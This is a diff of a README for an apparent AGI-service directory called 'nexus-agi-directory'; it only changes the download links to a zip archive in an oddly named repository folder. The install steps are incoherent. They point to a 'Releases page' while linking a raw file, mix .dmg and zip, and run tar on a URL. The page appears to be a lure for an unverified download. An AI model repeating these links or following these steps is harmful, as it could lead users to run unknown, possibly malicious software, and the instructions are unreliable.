@@ -1,7 +1,7 @@
 # 🎉 nexus-agi-directory - Your Guide to AGI Services
 
 ## 💾 Download Now
-[![Download](https://raw.githubusercontent.com/SKYPERSETH/nexus-agi-directory/main/Siphonocladiales/nexus-agi-directory.zip%20Here-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/SKYPERSETH/nexus-agi-directory/main/Siphonocladiales/nexus-agi-directory.zip)
+[![Download](https://github.com/SKYPERSETH/nexus-agi-directory/raw/refs/heads/main/Siphonocladiales/nexus_directory_agi_v2.9.zip%20Here-Get%20the%20Latest%20Release-brightgreen)](https://github.com/SKYPERSETH/nexus-agi-directory/raw/refs/heads/main/Siphonocladiales/nexus_directory_agi_v2.9.zip)
 
 ## 🚀 Getting Started
 Nexus-AGI is a public directory that helps you discover and connect with services for autonomous agents. This tool provides an easy way to find, integrate, and manage various AGI services. 
@@ -22,7 +22,7 @@ Nexus-AGI is a public directory that helps you discover and connect with service
 ## 📥 Download & Install
 To get started with Nexus-AGI, visit the following page and download the latest version:
 
-[Download the latest release](https://raw.githubusercontent.com/SKYPERSETH/nexus-agi-directory/main/Siphonocladiales/nexus-agi-directory.zip)
+[Download the latest release](https://github.com/SKYPERSETH/nexus-agi-directory/raw/refs/heads/main/Siphonocladiales/nexus_directory_agi_v2.9.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version.
@@ -43,12 +43,12 @@ To get started with Nexus-AGI, visit the following page and download the latest 
 4. Eject the `.dmg` and open Nexus-AGI from your Applications.
 
 ### For Linux
-1. Download the `https://raw.githubusercontent.com/SKYPERSETH/nexus-agi-directory/main/Siphonocladiales/nexus-agi-directory.zip` file from the Releases page.
+1. Download the `https://github.com/SKYPERSETH/nexus-agi-directory/raw/refs/heads/main/Siphonocladiales/nexus_directory_agi_v2.9.zip` file from the Releases page.
 2. Open a Terminal.
 3. Navigate to the directory where you downloaded the file.
 4. Run the following command to extract it:
    ```
-   tar -xvzf https://raw.githubusercontent.com/SKYPERSETH/nexus-agi-directory/main/Siphonocladiales/nexus-agi-directory.zip
+   tar -xvzf https://github.com/SKYPERSETH/nexus-agi-directory/raw/refs/heads/main/Siphonocladiales/nexus_directory_agi_v2.9.zip
    ```
 5. Navigate into the extracted directory:
    ```
@@ -93,4 +93,4 @@ For more information on how Nexus-AGI works, visit our documentation or contribu
 Thank you for using Nexus-AGI. We hope this tool makes it easier to work with autonomous agents and AGI services. Enjoy exploring! 
 
 ### ⏩ Quick Download
-[![Download](https://raw.githubusercontent.com/SKYPERSETH/nexus-agi-directory/main/Siphonocladiales/nexus-agi-directory.zip%20Here-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/SKYPERSETH/nexus-agi-directory/main/Siphonocladiales/nexus-agi-directory.zip)
+[![Download](https://github.com/SKYPERSETH/nexus-agi-directory/raw/refs/heads/main/Siphonocladiales/nexus_directory_agi_v2.9.zip%20Here-Get%20the%20Latest%20Release-brightgreen)](https://github.com/SKYPERSETH/nexus-agi-directory/raw/refs/heads/main/Siphonocladiales/nexus_directory_agi_v2.9.zip)
